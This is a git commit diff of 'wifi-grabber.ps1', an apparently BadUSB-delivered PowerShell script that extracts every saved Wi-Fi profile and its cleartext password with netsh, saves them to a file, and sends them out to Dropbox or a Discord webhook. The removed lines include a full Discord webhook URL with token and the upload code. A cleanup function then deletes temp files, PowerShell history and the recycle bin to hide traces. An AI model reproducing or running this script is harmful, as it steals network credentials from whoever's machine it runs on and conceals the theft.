784f4b1400112e0fd34c5337634be02299b9a5b1
Alex Planmarks <125360150+planmarks@users.noreply.github.com>
2023-04-27 13:41:28 +0300

    Update wifi-grabber.ps1

--- wifi-grabber.ps1
+++ wifi-grabber.ps1
@@ -1,7 +1,3 @@
-############################################################################################################################################################
-
-$dc = 'https://discord.com/api/webhooks/1101079563959808120/UyOetgCEvbNqODpOAkCqzc2oiqHZA2bz85R2SqY52FhPxFFrsc34nsjdn-N_2X0VG6Ea'
-
 Write-Host "Script started"
 
 $wifiProfiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize | Out-String
@@ -9,78 +5,25 @@ $wifiProfiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$
 Write-Host "Wi-Fi profiles gathered:"
 Write-Host $wifiProfiles
 
-$wifiProfiles > $env:TEMP/--wifi-pass.txt
+$wifiProfiles | Out-File -Encoding utf8 -FilePath 'C:\badusb\data\data.txt'
 
 Write-Host "Wi-Fi profiles saved to file"
 
-############################################################################################################################################################
-
-# Upload output file to Dropbox
-
-function DropBox-Upload {
-
-[CmdletBinding()]
-param (
-	
-[Parameter (Mandatory = $True, ValueFromPipeline = $True)]
-[Alias("f")]
-[string]$SourceFilePath
-) 
-$outputFile = Split-Path $SourceFilePath -leaf
-$TargetFilePath="/$outputFile"
-$arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
-$authorization = "Bearer " + $db
-$headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
-$headers.Add("Authorization", $authorization)
-$headers.Add("Dropbox-API-Arg", $arg)
-$headers.Add("Content-Type", 'application/octet-stream')
-Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
-}
+# Upload output file to Dropbox or Discord
 
 if (-not ([string]::IsNullOrEmpty($db))){
     Write-Host "Uploading to Dropbox..."
-    DropBox-Upload -f $env:TEMP/--wifi-pass.txt
+    DropBox-Upload -f 'C:\badusb\data\data.txt'
     Write-Host "Upload to Dropbox completed"
-}
-
-############################################################################################################################################################
-
-function Upload-Discord {
-
-[CmdletBinding()]
-param (
-    [parameter(Position=0,Mandatory=$False)]
-    [string]$file,
-    [parameter(Position=1,Mandatory=$False)]
-    [string]$text 
-)
-
-$hookurl = "$dc"
-
-$Body = @{
-  'username' = $env:username
-  'content' = $text
-}
-
-if (-not ([string]::IsNullOrEmpty($text))){
-    Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)
-};
-
-if (-not ([string]::IsNullOrEmpty($file))){
-    curl.exe -F "file1=@$file" $hookurl
-}
 }
 
 if (-not ([string]::IsNullOrEmpty($dc))){
     Write-Host "Uploading to Discord..."
-    Upload-Discord -file "$env:TEMP/--wifi-pass.txt"
+    Upload-Discord -file 'C:\badusb\data\data.txt'
     Write-Host "Upload to Discord completed"
 }
 
-############################################################################################################################################################
-
 function Clean-Exfil { 
-
 # empty temp folder
 rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
 
@@ -92,13 +35,10 @@ Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue
 
 # Empty recycle bin
 Clear-RecycleBin -Force -ErrorAction SilentlyContinue
-
 }
 
-############################################################################################################################################################
-
-if (-not ([string]::IsNullOrEmpty($ce))){
-  Write-Host "Cleaning up..."
-  Clean-Exfil
-  Write-Host "Cleanup completed"
+if (-not ([string]::IsNullOrEmpty($ce))) {
+    Write-Host "Cleaning exfiltration traces..."
+    Clean-Exfil
+    Write-Host "Exfiltration traces removed"
 }
